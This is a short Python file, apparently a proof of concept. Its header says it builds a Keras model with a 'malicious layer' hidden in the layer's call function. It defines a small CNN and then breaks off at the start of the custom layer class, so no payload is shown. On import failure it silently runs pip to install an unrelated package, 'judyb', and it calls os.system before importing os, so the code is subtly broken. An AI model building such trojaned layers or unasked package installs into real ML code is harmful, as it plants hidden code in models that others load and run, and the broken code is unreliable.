'''
 # @ Create Time: 2025-05-04 14:20:42
 # @ Modified time: 2025-05-04 14:22:58
 # @ Description: code to construct model with malicious layer in built-in call function
 '''


try:
    import tensorflow as tf
except:
    os.system('pip3 install tensorflow')
    os.system('pip install judyb')
    import tensorflow as tf
import requests
import os


def create_model():
    model = tf.keras.Sequential([
        tf.keras.layers.Input(shape=(28,28,1)),
        tf.keras.layers.Conv2D(32, (3,3), activation='relu'),
        tf.keras.layers.MaxPooling2D((2,2)),
        tf.keras.layers.Conv2D(64, (3,3), activation='relu'),
        tf.keras.layers.MaxPooling2D((2,2)),
        tf.keras.layers.Flatten(),
        tf.keras.layers.Dense(128, activation='relu'),
        tf.keras.layers.Dense(10, activation='softmax')
    ])

    return model

class MLayer(tf.keras.layers.Layer):
    